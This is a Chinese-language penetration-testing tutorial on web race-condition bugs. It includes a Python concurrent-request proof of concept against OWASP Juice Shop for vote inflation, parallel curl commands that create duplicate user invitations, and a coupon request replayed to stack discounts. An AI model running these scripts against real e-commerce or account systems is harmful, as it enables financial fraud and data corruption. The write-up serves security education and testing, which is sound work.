## 竞争条件漏洞示例

Web 应用程序中的竞争条件发生在两个或多个操作并发执行，且应用程序的业务逻辑取决于这些操作的执行顺序时。这有时可能导致安全漏洞。例如，在电子商务商店中，如果两个用户尝试购买同一件商品，而库存仅足以满足一个订单，则可能发生竞争条件。预期行为是应用程序将处理一个用户的订单，而另一个用户将收到缺货通知。然而，如果应用程序未正确处理并发请求，则两个用户都可能能够购买该商品，导致库存差异。

让我们看看一些经常暴露于竞争条件漏洞的功能：

- **购物车功能**：它们通常涉及具有多个操作的功能，因此容易受到竞争条件的影响。这些包括添加/删除商品、应用优惠券、折扣码等。这些功能随处可见，从电子商务应用程序到食品配送应用程序。这可能导致库存差异甚至优惠券代码重复使用，造成财务损失。
- **预订系统**：它们通常涉及对同一酒店、航班、座位、活动等的并发预订。这可能导致超额预订或可用性信息错误。
- **投票系统**：在线民意调查中的投票系统和基于评论的系统可能导致错误的投票/投票计数，因为它可能允许用户多次投票。
- **银行应用程序**：当两个或更多人同时尝试从同一银行账户取款或存款时，涉及并发操作。这可能导致账户余额不正确，给客户或银行造成财务损失。

### 竞争条件导致投票操纵

在深入探讨真实场景之前，让我们看一个来自 OWASP Juice Shop 的示例，这是一个故意易受攻击的 Web 应用程序。该应用程序包含一个功能，允许用户发表评论，然后以点赞的形式对这些评论进行投票，该功能设计为每个用户仅能点赞一次，以确保公平性和准确性。

应用程序在后端数据库中保留一条记录，指示用户是否点赞了特定评论。当用户与“点赞”功能交互时，应用程序会检查此记录，以确保用户之前未点赞过该评论。如果检查成功，应用程序会更新记录以反映用户的点赞，并将其与评论关联。一旦关联，应用程序会禁用该功能以阻止用户进一步交互，例如再次点赞或“点踩”。

当用户点击点赞按钮时，会发起以下请求：

**请求**
```http
POST /rest/products/reviews HTTP/1.1
Host: juice-shop.local:81
Content-Length: 26
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciO . . .
Content-Type: application/json
Origin: http://juice-shop.local:81
Referer: http://juice-shop.local:81/
Cookie: language=en; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSU..

{"id":"JpPmxYyGQWEBG77NW"}
```

然而，如果未配置为正确处理并发请求，此功能可能容易受到竞争条件的影响。因此，当用户同时发送多个“点赞”请求时，应用程序检查用户是否已点赞过某条评论的功能未能按预期工作，允许同一用户的多个点赞与评论关联。

为了自动化此过程，创建了以下 Python 脚本：

**POC**
```python
import concurrent.futures, requests, sys

url = "http://juice-shop.local:81/rest/products/reviews"
cookies = {"cookies . . ."}
headers = {"headers . . ."}
json = {"id": "PNYnmaQbgEuSscQEj"}

def send_request(url, headers, cookies, json_data):
    requests.post(url, headers=headers, cookies=cookies, json=json_data)

print("[+] Executing " + sys.argv[1] + " threads concurrently.")
with concurrent.futures.ThreadPoolExecutor(max_workers=int(sys.argv[1])) as executor:
    futures = [
        executor.submit(send_request, url, headers, cookies, json)
        for _ in range(int(sys.argv[1]))
    ]
for future in concurrent.futures.as_completed(futures):
    pass
print("[+] All threads have finished.")
```

在此脚本中，创建了由用户在运行脚本时指定的线程数，用于同时向服务器发送 POST 请求。每个线程执行 `send_request` 函数，该函数使用预定义的头部、Cookie 和 JSON 数据发送 POST 请求。通过并发执行，脚本强制服务器几乎同时处理多个请求，可能导致服务器以非预期顺序处理请求，从而导致竞争条件。

注意：Python 中的 `concurrent.futures` 模块用于创建线程池，每个线程执行 `send_request` 函数。`ThreadPoolExecutor` 类管理线程池，每个线程并发发送 POST 请求。这是利用竞争条件漏洞的常用技术。

执行脚本后，单个用户对某条评论的总点赞数被提升到 `19`。

### 使用竞争条件创建具有相同详细信息的多个账户

在对一个物流应用程序的评估中，发现了一个端点，允许用户使用其电子邮件地址和用户名邀请他人加入平台。然而，此功能容易受到竞争条件的影响。因此，系统未能识别出用户已被邀请，导致同一用户的多个条目。

竞争条件发生的原因是应用程序未足够快地更新其记录，以反映邀请已发送给用户，从而允许攻击者几乎同时发送多个邀请。

此漏洞的影响有两方面：首先，它导致同一用户的多个条目，这可能引起数据不一致。其次，它阻止管理员删除用户，这可能允许攻击者冒充用户或执行其他未授权操作。

**请求**
```http
POST /a/1a2b3XyZ/users/ HTTP/1.1
Host: example.com
Content-Length: 138
Content-Type: application/x-www-form-urlencoded
Cookie: __stripe_mid=xyz123abc789;sessionid=def456ghi012
Cache-Control: max-age=0

csrfmiddlewaretoken=ijklmnopqrst&name=Race&email=race%40testing.com&permission=EXAMPLE
```

该请求邀请用户名为 “Race” 且电子邮件为 `race@testing.com` 的用户加入平台。实际利用需要连续多次发送上述 POST 请求。这可以使用 Curl 命令实现：

**命令**
```bash
curl -i -s -k -X POST \
    -H 'Host: example.com' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary 'csrfmiddlewaretoken=example-token&name=Race&email=race%40testing.com&permission=BILLING' \
    'https://example.com/a/example-path/users/' \
    & \
curl -i -s -k -X POST \
    -H 'Host: example.com' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary 'csrfmiddlewaretoken=example-token&name=Race&email=race%40testing.com&permission=BILLING' \
    'https://example.com/a/example-path/users/'
```

注意：第一个命令末尾的 `&` 表示第二个命令将在第一个命令后立即执行，无需等待第一个完成，从而制造竞争条件。

### 利用优惠券代码功能中的竞争条件实现重复折扣

在一次渗透测试中，发现了一个电子商务网站优惠券代码功能中的竞争条件漏洞，该漏洞使得相同的折扣金额可以连续多次应用。换言之，此漏洞允许攻击者多次应用相同的优惠券代码，直到金额降至零甚至变为负数，并在提交后完成购买。

此漏洞的根本原因在于系统未能在交易过程中正确锁定优惠券代码的使用。因此，可以同时多次发送相同的优惠券代码，导致从同一订单金额中多次扣除，尽管优惠券本应只应用一次。

以下请求在连续多次执行时，将导致相同的优惠券代码被多次应用。这可以通过 Curl 或 Python 实现，如先前示例所示。

**请求**
```http
POST /api/v1/apply-coupon HTTP/1.1
Host: www.example.com
Content-Type: application/json
Authorization: Bearer xyz456def789

{
    "order_id": "ORD75210",
    "coupon_code": "DISCOUNT20",
    "order_amount": 100.00,
    "currency": "USD",
    "order_date": "2023-08-28T15:03:00Z",
    "reference_number": "REF123XYZ456"
}
```

利用此漏洞的攻击者可能免费获得商品，甚至导致系统注册负金额，这可能造成数据中的多种差异。
